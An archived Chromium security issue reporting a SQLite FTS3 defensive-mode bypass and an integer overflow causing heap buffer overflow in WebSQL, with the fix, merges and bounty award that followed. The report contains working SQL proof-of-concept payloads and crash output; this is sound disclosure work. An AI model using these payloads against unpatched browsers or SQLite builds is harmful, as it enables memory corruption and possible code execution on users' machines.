# Security: Report 2 Vulnerabilities in WebSQL

| Field | Value |
|-------|-------|
| **Issue ID** | [40061151](https://issues.chromium.org/issues/40061151) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Storage>WebSQL |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | 13...@gmail.com |
| **Assignee** | as...@chromium.org |
| **Created** | 2022-09-26 |
| **Bounty** | $10,000.00 |

## Description

**This template is ONLY for reporting security bugs. If you are reporting a**  

**Download Protection Bypass bug, please use the "Security - Download**  

**Protection" template. For all other reports, please use a different**  

**template.**

**Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com>**  

**/chromium/src/+/HEAD/docs/security/faq.md**

**Please see the following link for instructions on filing security bugs:**  

**<https://www.chromium.org/Home/chromium-security/reporting-security-bugs>**

**Reports may be eligible for reward payments under the Chrome VRP:**  

**<http://g.co/ChromeBugRewards>**

**NOTE: Security bugs are normally made public once a fix has been widely**  

**deployed.**

**-------------------------**

**VULNERABILITY DETAILS**  

Here I am reporting 2 vulnerabilities in WebSQL (sqlite).

The first one is SQLite FTS3 Defensive Mode bypass. The second is an integer overflow, we can get a controllable heap buffer overflow (with both size and content).

I. SQLite FTS3 Defensive Mode Bypass

SQLite has introduced SQLITE\_DBCONFIG\_DEFENSIVE config which will disallow any operation on shadow tables.

```
sqlite> delete from f_segments;  
Parse error: table f_segments may not be modified  

```

Those operations are denied by checking if db->flags has SQLITE\_Defensive mark in each handler (... yy\_reduce > sqlite3Update -> sqlite3IsReadOnly -> tabIsReadOnly).

```
static int tabIsReadOnly(Parse \*pParse, Table \*pTab){  
...  
  db = pParse->db;  
  if( (pTab->tabFlags & TF_Readonly)!=0 ){  
    return sqlite3WritableSchema(db)==0 && pParse->nested==0;  
  }  
...  
  return sqlite3ReadOnlyShadowTables(db);  
}  
  
SQLITE_PRIVATE int sqlite3WritableSchema(sqlite3 \*db){  
...  
  return (db->flags&(SQLITE_WriteSchema|SQLITE_Defensive))==SQLITE_WriteSchema;  
}  

```

However, if we try to modify protected table in a trigger, we can by pass those checks, because those queries are running inside sqlite3VdbeExec and will not be checked by SQLITE\_Defensive.

Recommend: Add checks for those triggers.

PoC in SQLite:

```
create virtual table f using fts3(a);  
create trigger tt after insert on f_segdir for each row begin  
 insert into f_segdir values(888, 0, 0, 0, '0 18', x'1234');  
end;  
insert into f values ("text");  

```

II. Integer Overflow Caused Heap Buffer Overflow

The fts3GrowSegReaderBuffer has a signed int nReq as its argument. Only when nReq > nBuffer the new buffer is allocated. When nReq is overflowed to a negative number, the realloc is skipped and it still returns SQLITE\_OK (should be SQLITE\_NOMEM).

```
static int fts3GrowSegReaderBuffer(Fts3MultiSegReader \*pCsr, int nReq){  
  if( nReq>pCsr->nBuffer ){  
    char \*aNew;  
    pCsr->nBuffer = nReq\*2;  
    aNew = sqlite3_realloc(pCsr->aBuffer, pCsr->nBuffer);  
    if( !aNew ){  
      return SQLITE_NOMEM;  
    }  
    pCsr->aBuffer = aNew;  
  }  
  return SQLITE_OK;  
}  

```

The code in sqlite3Fts3SegReaderStep will parse different segdirs, and extract nList [1], it will be used in [2] as the bytes required for this round. At [3], the bytes required for this round + nDoclist (bytes consumed for all previous rounds) + 20 padding will be calculated as nReq for fts3GrowSegReaderBuffer.

```
     while( apSegment[0]->pOffsetList ){  
        int j;                    /\* Number of segments that share a docid \*/  
        char \*pList = 0;  
        int nList = 0;  
        int nByte;  
        sqlite3_int64 iDocid = apSegment[0]->iDocid;  
        fts3SegReaderNextDocid(p, apSegment[0], &pList, &nList); //[1]  
        ...  
        if( !isIgnoreEmpty || nList>0 ){  
          ...  
          nByte = sqlite3Fts3VarintLen(iDelta) + (isRequirePos?nList+1:0); //[2]  
  
          rc = fts3GrowSegReaderBuffer(pCsr, nByte+nDoclist+FTS3_NODE_PADDING); //[3]  
          if( rc ) return rc;  
  
          if( isFirst ){  
            ....  
          }else{  
            nDoclist += sqlite3Fts3PutVarint(&pCsr->aBuffer[nDoclist], iDelta);  
            iPrev = iDocid;  
            if( isRequirePos ){  
              memcpy(&pCsr->aBuffer[nDoclist], pList, nList);  
              nDoclist += nList;  //[4]  
              pCsr->aBuffer[nDoclist++] = '\0';  
            }  
          }  
        }  
  
        fts3SegReaderSort(apSegment, nMerge, j, xCmp); //[5]  
      }  

```

We can create multiple `segdir` entries with same `blockid` and different `level`s, and insert them in ascend orders, so the fts3SegReaderSort [5] will keep sorting two entries. In each round, one of them will be processed. Assume the `round` is a variable, and we have same `nLists`for each `segdir` entry, `L` is the `sqlite3Fts3VarintLen` , a simple function to calculate the total required `nReq` bytes will be:`nReq = (L(iDelta) + nList + 1) \* round + 20`.

For example, if we have `L(iDelta) = 1, nList = 0x12493000`, in round 7 we will overflow nReq.

```
size = 306786304  
Round 1, nReq = 306786326, nAlloc = 613572652  
Round 2, nReq = 613572631, nAlloc = 613572652  
Round 3, nReq = 920358936, nAlloc = 1840717872  
Round 4, nReq = 1227145241, nAlloc = 1840717872  
Round 5, nReq = 1533931546, nAlloc = 1840717872  
Round 6, nReq = 1840717851, nAlloc = 1840717872  
Round 7, nReq = -2147463140, nAlloc = 1840717872  

```

The nReq is only for requesting larger memory, after the overflow happens, small nList will be used in [4].

nDoclist is the previously used memory count, because the memory doesn't realloced to a larger memory, here heap buffer overflow will happen:

`memcpy(&pCsr->aBuffer[nDoclist], pList, nList);`

Because all 3 parameters(pList/nList/nDoclist) is controllable by us, so we will get a controllable heap buffer overflow here, which can potentially run arbitrary code in Render process.

PoC for SQLite with no defensive activated (For a simpler view):

```
CREATE VIRTUAL TABLE f USING fts3(a);  
CREATE TABLE 'f_stat'(id INTEGER PRIMARY KEY, value BLOB);  
INSERT INTO f_segdir VALUES(889, 0, 0, 0, '16 33', x'0264');  
INSERT INTO f_segdir VALUES(888, 0, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'00' || replace(hex(zeroblob(0x12493000)), '00',x'01') || x'00');  
#82e0a49201: S=0x12493002, 2 bytes (following x'0\*' and ending x'00') + zeroblob 0x12493000  
#zeroblob 0x12493000: the length of nList. the content of this blob is pList.  
#Here we created 7 same segdir entries, with different levels, they will be processed one by one in sqlite3Fts3SegReaderStep.  
# x'00' ~ x'06' (x'0\*') = iDocid, should be different for each entry.  
INSERT INTO f_segdir VALUES(888, 1, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'01' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
INSERT INTO f_segdir VALUES(888, 2, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'02' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
INSERT INTO f_segdir VALUES(888, 3, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'03' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
INSERT INTO f_segdir VALUES(888, 4, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'04' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
INSERT INTO f_segdir VALUES(888, 5, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'05' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
INSERT INTO f_segdir VALUES(888, 6, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'06' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
INSERT INTO f_segments(blockid) values(16);  
INSERT INTO f_segments values(0, x'');  
INSERT INTO f_segments values(100, x'0101020101');  
INSERT INTO f_segments values(2, x'010103010101');  
#F806: Sqlite int for 888 (segdir level);    
#07: How many segs will be processed, should be the same as entry count in segdir. (nSegments <= nSeg)  
INSERT INTO f_stat VALUES(1, x'F80607');  
INSERT INTO f(f) VALUES('merge=1');  

```

PoC for SQLite with Defensive Flags + FTS4 disabled (simulates Google Chrome environment):

```
create virtual table f using fts3(a);  
#use an invalid merge command to create table f_stat:  
insert into f(f) values('merge=2,3');  
  
create trigger tt after insert on f_content for each row begin  
  DELETE FROM f_segdir where level = 0;  
  INSERT OR IGNORE INTO f_segdir VALUES(889, 0, 0, 0, '16 33', x'0264');  
  INSERT OR IGNORE INTO f_segdir VALUES(888, 0, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'00' || replace(hex(zeroblob(0x12493000)), '00',x'01') || x'00');  
  INSERT OR IGNORE INTO f_segdir VALUES(888, 1, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'01' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
  INSERT OR IGNORE INTO f_segdir VALUES(888, 2, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'02' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
  INSERT OR IGNORE INTO f_segdir VALUES(888, 3, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'03' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
  INSERT OR IGNORE INTO f_segdir VALUES(888, 4, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'04' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
  INSERT OR IGNORE INTO f_segdir VALUES(888, 5, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'05' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
  INSERT OR IGNORE INTO f_segdir VALUES(888, 6, 0, 0, '0 18', x'0003313233' || x'82e0a49201'|| x'06' || replace(hex(zeroblob(0x12493000)), '00', x'01') || x'00');  
  INSERT INTO f_segments(blockid) values(16);  
  INSERT INTO f_segments values(0, x'');  
  INSERT INTO f_segments values(100, x'0101020101');  
  INSERT INTO f_segments values(2, x'010103010101');  
  INSERT INTO f_stat VALUES(1, x'F80607');  
end;  
  
#Activate Trigger:  
insert into f values ("text");  
  
INSERT INTO f(f) VALUES('merge=1');  

```

Fix Advice:

```
    static int fts3GrowSegReaderBuffer(Fts3MultiSegReader \*pCsr, int nReq){  
   +  if( nReq <= 0 )  
   +    return SQLITE_NOMEM;  
  
      if( nReq>pCsr->nBuffer ){  
        char \*aNew;  
        pCsr->nBuffer = nReq\*2;  
        aNew = sqlite3_realloc(pCsr->aBuffer, pCsr->nBuffer);  
        if( !aNew ){  
          return SQLITE_NOMEM;  
        }  
        pCsr->aBuffer = aNew;  
      }  
      return SQLITE_OK;  
    }  

```

**VERSION**  

Chrome Version: 105.0.5195.127 stable (x64)  

Operating System: Windows 11 Simplified Chinese

**REPRODUCTION CASE**  

poc-bypass.html: bypass fts3 defensive mode  

poc-heapbufferoverflow.html : use two vulnerabilities to perform a heap buffer overflow.

A little more explanation for poc-heapbufferoverflow:

```
Here I split multiple "INSERT OR IGNORE INTO" clause into multiple triggers, that's because if I put them together in one trigger, the trigger will soon consume ~7GB memory and the Chrome will throw an error and exit.  
  
  
While they are split, each "INSERT OR IGNORE INTO" will take about 1.2GB memory, then write data back to disk, which will not trigger the memory limit of the Chrome.  

```

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer crash  

Crash State:

```
0:021> g  
(1434.1050): Access violation - code c0000005 (first chance)  
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.  
chrome!GetHandleVerifier+0x1fef7f9:  
00007ffc`91233219 660f7f6170      movdqa  xmmword ptr [rcx+70h],xmm4 ds:000048a9`38977000=????????????????????????????????  

```

**CREDIT INFORMATION**  

Reporter credit: Kaijie Xu (@kaijieguigui)

## Attachments

- [poc-bypass.html](attachments/poc-bypass.html) (text/plain, 720 B)
- [poc-heapbufferoverflow.html](attachments/poc-heapbufferoverflow.html) (text/plain, 3.9 KB)

## Timeline

### [Deleted User] (2022-09-26)

[Empty comment from Monorail migration]

### hc...@google.com (2022-09-26)

OP, am I supposed to just open the poc files to crash the browser? Not 100% sure. 

ccing some WebSQL folks as well

[Monorail components: Blink>Storage>WebSQL]

### ay...@chromium.org (2022-09-26)

Hi Dr. Hipp + Daniel (sqlite authors) , can you help take a look?

+ asully@, estade@ for sqlite

### ay...@chromium.org (2022-09-26)

[Empty comment from Monorail migration]

### dr...@gmail.com (2022-09-27)

Preliminary fix at https://sqlite.org/src/timeline?c=c41f25e6f3591e57.  More patches might follow before we are done.

### hc...@google.com (2022-09-27)

[Empty comment from Monorail migration]

### hc...@google.com (2022-09-27)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-27)

[Empty comment from Monorail migration]

### ad...@google.com (2022-09-28)

mek@ I'm assuming you're a good person to take care of merging the fixes here into Chromium, please reassign if not.

### me...@chromium.org (2022-09-28)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-28)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-09-28)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### as...@chromium.org (2022-09-30)

3.39.4 just came out. Starting the roll process

Following up on https://crbug.com/chromium/1368076#c5, does 3.39.4 contain all the patches needed to address this bug?

### as...@chromium.org (2022-10-01)

Chrome has been rolled to 3.39.4 (https://crrev.com/c/3931183). Marking as fixed to kick off merge review process

### [Deleted User] (2022-10-01)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-01)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-01)

This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M106. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M107. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-10-01)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), eakpobaro (iOS), dgagnon (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-10-01)

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), harrysouders (iOS), ceb (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### as...@chromium.org (2022-10-03)

1. Why does your merge fit within the merge criteria for these milestones?

Yes, high-severity security bug

2. What changes specifically would you like to merge? Please link to Gerrit.

Original CL: https://crrev.com/c/3931183
M107 cherry-pick: https://crrev.com/c/3931183
M106 cherry-pick: https://crrev.com/c/3932460

3. Have the changes been released and tested on canary?

Yes

4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

No

5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents

N/A

6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

No

### go...@chromium.org (2022-10-05)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-10-05)

M107 merge approved, please merge this update to branch 5304 at your earliest availability so this update can go into next beta/107
M106 merge approved, please merge to branch 5249 to your earliest convenience so this update can be included in the m106/stable respin next week (please merge before noon PST Friday, 7 October if at all possible) -- thank you! 

### gi...@appspot.gserviceaccount.com (2022-10-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/d31cf5335937b5f4e9b9f67ec0e1b104148957a5

commit d31cf5335937b5f4e9b9f67ec0e1b104148957a5
Author: Austin Sullivan <asully@chromium.org>
Date: Wed Oct 05 20:20:46 2022

[M107] sqlite: Upgrade to 3.39.4

Roll src/third_party/sqlite/src/ 5fb64c1a1..b48b7b78f (10 commits)

https://chromium.googlesource.com/chromium/deps/sqlite.git/+log/5fb64c1a111a..b48b7b78fcdf

$ git log 5fb64c1a1..b48b7b78f --date=short --no-merges --format='%ad %ae %s'
2022-09-30 asully Amalgamations for release 3.39.4
2022-09-29  Version 3.39.4
2022-09-28  Fix misuse of the sqlite3_set_auxdata() interface in the ICU extension.
2022-09-28  Remove a NEVER macro in defragmentPage() that dbsqlfuzz discovered can be true.  crash-32d9312f145cdce41613573f6431d9a3e439e3d7
2022-09-27  Enhance defensive mode so that it disallows CREATE TRIGGER statements if the statements within the trigger attempt to write on a shadow table.  Also make the legacy FTS3 code more robust against integer overflow during memory allocation.
2022-09-10 Dan Kennedy Enhance the b-tree page sorting code to ensure that sqlite3PagerRekey() never overloads a page number and uses only the PENDING_BYTE page for temporary storage.
2022-09-07  Enhance an assert() to impose for tighter constraints on the operation of pcache.
2022-09-07  Fix the windows build so that it works with -DSQLITE_OMIT_AUTOINIT.
2022-09-07  Ensure that the Rekey() operation does not overwrite an existing page number.
2022-09-07  Increase the version number to 3.39.4

Created with:
  roll-dep src/third_party/sqlite/src

(cherry picked from commit f53a9502a0001792114380c850a25c693ddd6308)

Bug: 1370100, 1368076
Change-Id: I0b23f0eae8a8664f037771351c4746cd427a1395
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3931183
Reviewed-by: Evan Stade <estade@chromium.org>
Commit-Queue: Evan Stade <estade@chromium.org>
Auto-Submit: Austin Sullivan <asully@chromium.org>
Commit-Queue: Austin Sullivan <asully@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1053853}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3932925
Reviewed-by: Ayu Ishii <ayui@chromium.org>
Commit-Queue: Ayu Ishii <ayui@chromium.org>
Cr-Commit-Position: refs/branch-heads/5304@{#459}
Cr-Branched-From: 5d7b1fc9cb7103d9c82eed647cf4be38cf09738b-refs/heads/main@{#1047731}

[modify] https://crrev.com/d31cf5335937b5f4e9b9f67ec0e1b104148957a5/third_party/sqlite/README.chromium
[modify] https://crrev.com/d31cf5335937b5f4e9b9f67ec0e1b104148957a5/DEPS


### [Deleted User] (2022-10-05)

LTS Milestone M102

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2022-10-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/9ad99d0b58af357005dc8171dd074803d603703a

commit 9ad99d0b58af357005dc8171dd074803d603703a
Author: Austin Sullivan <asully@chromium.org>
Date: Wed Oct 05 21:28:50 2022

[M106] sqlite: Upgrade to 3.39.4

Roll src/third_party/sqlite/src/ 5fb64c1a1..b48b7b78f (10 commits)

https://chromium.googlesource.com/chromium/deps/sqlite.git/+log/5fb64c1a111a..b48b7b78fcdf

$ git log 5fb64c1a1..b48b7b78f --date=short --no-merges --format='%ad %ae %s'
2022-09-30 asully Amalgamations for release 3.39.4
2022-09-29  Version 3.39.4
2022-09-28  Fix misuse of the sqlite3_set_auxdata() interface in the ICU extension.
2022-09-28  Remove a NEVER macro in defragmentPage() that dbsqlfuzz discovered can be true.  crash-32d9312f145cdce41613573f6431d9a3e439e3d7
2022-09-27  Enhance defensive mode so that it disallows CREATE TRIGGER statements if the statements within the trigger attempt to write on a shadow table.  Also make the legacy FTS3 code more robust against integer overflow during memory allocation.
2022-09-10 Dan Kennedy Enhance the b-tree page sorting code to ensure that sqlite3PagerRekey() never overloads a page number and uses only the PENDING_BYTE page for temporary storage.
2022-09-07  Enhance an assert() to impose for tighter constraints on the operation of pcache.
2022-09-07  Fix the windows build so that it works with -DSQLITE_OMIT_AUTOINIT.
2022-09-07  Ensure that the Rekey() operation does not overwrite an existing page number.
2022-09-07  Increase the version number to 3.39.4

Created with:
  roll-dep src/third_party/sqlite/src

(cherry picked from commit f53a9502a0001792114380c850a25c693ddd6308)

Bug: 1370100, 1368076
Change-Id: I0b23f0eae8a8664f037771351c4746cd427a1395
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3931183
Reviewed-by: Evan Stade <estade@chromium.org>
Commit-Queue: Evan Stade <estade@chromium.org>
Auto-Submit: Austin Sullivan <asully@chromium.org>
Commit-Queue: Austin Sullivan <asully@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1053853}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3932460
Reviewed-by: Ayu Ishii <ayui@chromium.org>
Cr-Commit-Position: refs/branch-heads/5249@{#757}
Cr-Branched-From: 4f7bea5de862aaa52e6bde5920755a9ef9db120b-refs/heads/main@{#1036826}

[modify] https://crrev.com/9ad99d0b58af357005dc8171dd074803d603703a/third_party/sqlite/README.chromium
[modify] https://crrev.com/9ad99d0b58af357005dc8171dd074803d603703a/DEPS


### as...@chromium.org (2022-10-05)

LTS Milestone M102 questionnaire:

1. Was this issue a regression for the milestone it was found in?

No, these vulnerabilities have existed in SQLite for quite a while

2. Is this issue related to a change or feature merged after the latest LTS Milestone?

No

### rz...@google.com (2022-10-06)

[Empty comment from Monorail migration]

### rz...@google.com (2022-10-06)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-06)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2022-10-06)

1. https://crrev.com/c/3933554 and a CL for updating DEPS
2. Low, no conflicts
3. 106
4. Yes

### am...@google.com (2022-10-06)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-10-07)

Congratulations, Kaijie Xu! The VRP Panel has decided to award you $10,000 for the RCE + $3,000 for the exploitation mitigation bypass for a reward total of $13,000 for this report. Thank you for your efforts in reporting these issues to us -- nice work! 

### am...@google.com (2022-10-08)

[Empty comment from Monorail migration]

### 13...@gmail.com (2022-10-08)

Thank you very much!

### am...@chromium.org (2022-10-11)

[Empty comment from Monorail migration]

### gm...@google.com (2022-10-13)

[Empty comment from Monorail migration]

### am...@google.com (2022-10-14)

[Empty comment from Monorail migration]

### gm...@google.com (2022-10-18)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-10-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/sqlite/+/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899

commit d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899
Author: drh <>
Date: Tue Oct 18 18:55:52 2022

[M102-LTS] Enhance defensive mode so that it disallows CREATE TRIGGER statements if
the statements within the trigger attempt to write on a shadow table.  Also
make the legacy FTS3 code more robust against integer overflow during
memory allocation.

Bug: 1368076
FossilOrigin-Name: c41f25e6f3591e575452c4c68f8072a0163cc00d80af31f90d407c7deca79622
(cherry picked from commit 3ec786ab9cfa213525ecc18b326aeb18ab842f7d)
Change-Id: I3b2cbf7c04f1873a6001d577feefaa8abd9f2a7d
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/sqlite/+/3933554
Reviewed-by: Ayu Ishii <ayui@chromium.org>

[modify] https://crrev.com/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899/amalgamation_dev/sqlite3.c
[modify] https://crrev.com/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899/amalgamation/sqlite3.c
[modify] https://crrev.com/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899/manifest
[modify] https://crrev.com/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899/ext/fts3/fts3Int.h
[modify] https://crrev.com/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899/ext/fts3/fts3_tokenizer1.c
[modify] https://crrev.com/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899/ext/fts3/fts3.c
[modify] https://crrev.com/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899/amalgamation/sqlite3.h
[modify] https://crrev.com/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899/ext/fts3/fts3_porter.c
[modify] https://crrev.com/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899/src/trigger.c
[modify] https://crrev.com/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899/ext/fts3/fts3_write.c
[modify] https://crrev.com/d7feae867b83c8f4dcab0c1c7d0a5a9353a3b899/amalgamation_dev/sqlite3.h


### gi...@appspot.gserviceaccount.com (2022-10-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/2cbcbbb2be2830acc74038b0ebbd0094cf9fafb5

commit 2cbcbbb2be2830acc74038b0ebbd0094cf9fafb5
Author: Roger Zanoni <rzanoni@google.com>
Date: Wed Oct 19 08:15:15 2022

[M102-LTS] Roll src/third_party/sqlite/src/ d9eae184e..d7feae867 (1 commit)

https://chromium.googlesource.com/chromium/deps/sqlite.git/+log/d9eae184eb4a..d7feae867b83

$ git log d9eae184e..d7feae867 --date=short --no-merges --format='%ad %ae %s'
2022-10-18  [M102-LTS] Enhance defensive mode so that it disallows CREATE TRIGGER statements if the statements within the trigger attempt to write on a shadow table.  Also make the legacy FTS3 code more robust against integer overflow during memory allocation.

Created with:
  roll-dep src/third_party/sqlite/src

Bug: 1368076
Change-Id: Ifd4fd4a46cbe05f64345edb5e56ed406f7e9229f
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3964571
Reviewed-by: Achuith Bhandarkar <achuith@chromium.org>
Owners-Override: Achuith Bhandarkar <achuith@chromium.org>
Commit-Queue: Roger Felipe Zanoni da Silva <rzanoni@google.com>
Cr-Commit-Position: refs/branch-heads/5005@{#1370}
Cr-Branched-From: 5b4d9450fee01f821b6400e947b3839727643a71-refs/heads/main@{#992738}

[modify] https://crrev.com/2cbcbbb2be2830acc74038b0ebbd0094cf9fafb5/DEPS


### rz...@google.com (2022-10-19)

[Empty comment from Monorail migration]

### pg...@google.com (2022-11-01)

[Empty comment from Monorail migration]

### [Deleted User] (2023-01-07)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1368076?no_tracker_redirect=1

[Monorail blocked-on: crbug.com/chromium/1370100]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40061151)*
